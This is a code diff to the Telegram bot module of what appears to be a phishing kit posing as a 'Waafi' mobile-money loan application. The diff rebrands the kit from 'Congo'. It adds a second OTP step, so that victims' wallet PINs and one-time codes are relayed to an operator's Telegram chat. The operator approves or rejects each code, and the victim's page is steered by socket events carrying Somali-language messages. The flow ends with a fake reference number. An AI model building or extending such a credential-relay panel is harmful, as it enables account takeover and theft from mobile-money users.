@@ -13,7 +13,7 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
 /**
  * Strips out characters that break Telegram Markdown parsing
- * FIX: Removed hyphen escaping to prevent App ID string corruption (e.g., COD-XXXXX)
+ * FIX: Removed hyphen escaping to prevent App ID string corruption
  */
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -29,7 +29,7 @@ function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
     let detailedFields = '';
     if (data && typeof data === 'object') {
         Object.entries(data).forEach(([key, val]) => {
-            if (val !== undefined && val !== null && val !== '') {
+            if (val !== undefined && val !== null && val !== '' && key !== 'appId') {
                 detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
             }
         });
@@ -38,7 +38,7 @@ function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
     }
 
     const message = `
-📱 *Congo Application: ${escapeMarkdown(appId)}*
+📱 *Waafi Application: ${escapeMarkdown(appId)}*
 ━━━━━━━━━━━━━━━━━━━━━━━━
 📢 *${escapeMarkdown(stepTitle)}*
 ━━━━━━━━━━━━━━━━━━━━━━━━
@@ -91,6 +91,37 @@ Status: *Awaiting Disbursement Confirmation Action*
         .catch((err) => console.error(`❌ [TELEGRAM ERROR] Step 5 PIN dispatch failed:`, err.message));
 }
 
+// STEP 6 ADDITION START
+/**
+ * Step 6: Dispatches the second verification OTP card
+ */
+function sendSecondOTP(appId, otp2Value) {
+    if (!CHAT_ID) return;
+
+    const message = `
+🔑 *Second OTP (Step 6) for ID: ${escapeMarkdown(appId)}*
+━━━━━━━━━━━━━━━━━━━━━━━━
+• *Target OTP 2 Code:* \`${escapeMarkdown(otp2Value)}\`
+━━━━━━━━━━━━━━━━━━━━━━━━
+Status: *Awaiting Admin Verification Confirmation*
+    `.trim();
+
+    const options = {
+        parse_mode: 'Markdown',
+        reply_markup: {
+            inline_keyboard: [[
+                { text: "✅ APPROVE OTP2", callback_data: `approve_otp2:${appId}` },
+                { text: "❌ REJECT OTP2", callback_data: `reject_otp2:${appId}` }
+            ]]
+        }
+    };
+
+    bot.sendMessage(CHAT_ID, message, options)
+        .then(() => console.log(`✅ [TELEGRAM] Step 6 operational OTP2 dispatch completed for ${appId}`))
+        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Step 6 OTP2 dispatch failed:`, err.message));
+}
+// STEP 6 ADDITION END
+
 // Telegram Inline Interactive Webhook Processing Engine
 bot.on('callback_query', async (callbackQuery) => {
     const actionData = callbackQuery.data;
@@ -114,13 +145,21 @@ bot.on('callback_query', async (callbackQuery) => {
         global.io.to(targetAppId).emit('otp-failed', { message: "Code-ka OTP-ga aad gelisay waa khalad." });
         auditLogExecutionState = "❌ OTP signature flagged invalid. Verification error sent to user.";
     } else if (actionSignal === 'approve_pin') {
-        const generatedRef = 'COD-' + Math.floor(100000 + Math.random() * 900000);
-        global.io.to(targetAppId).emit('pin-verified', { referenceId: generatedRef });
-        auditLogExecutionState = "💰 FINAL DISBURSEMENT RUN COMPLETE. Reference signature locked.";
+        global.io.to(targetAppId).emit('pin-verified');
+        auditLogExecutionState = "💳 PIN verified. Frontend shifted to Step 6 (OTP 2) mode.";
     } else if (actionSignal === 'reject_pin') {
         global.io.to(targetAppId).emit('pin-failed', { message: "PIN-ka koontada aad gelisay waa khalad." });
         auditLogExecutionState = "❌ Wallet security PIN matched incorrect code. Input reset issued.";
+    // STEP 6 ADDITION START
+    } else if (actionSignal === 'approve_otp2') {
+        const generatedRef = 'WFI-' + Math.floor(100000 + Math.random() * 900000);
+        global.io.to(targetAppId).emit('admin-approve-otp2', { referenceId: generatedRef });
+        auditLogExecutionState = "💰 FINAL DISBURSEMENT RUN COMPLETE. Reference signature locked.";
+    } else if (actionSignal === 'reject_otp2') {
+        global.io.to(targetAppId).emit('otp2-failed', { message: "Koodhka xaqiijinta labaad ee aad gelisay waa khalad." });
+        auditLogExecutionState = "❌ Second OTP flagged invalid. Verification error sent to user.";
     }
+    // STEP 6 ADDITION END
 
     // Update the administrative card view inside Telegram to prevent double clicks
     try {
@@ -138,5 +177,6 @@ bot.on('callback_query', async (callbackQuery) => {
 module.exports = {
     bot,
     sendToAdmin,
-    sendFinalApproval
+    sendFinalApproval,
+    sendSecondOTP
 };
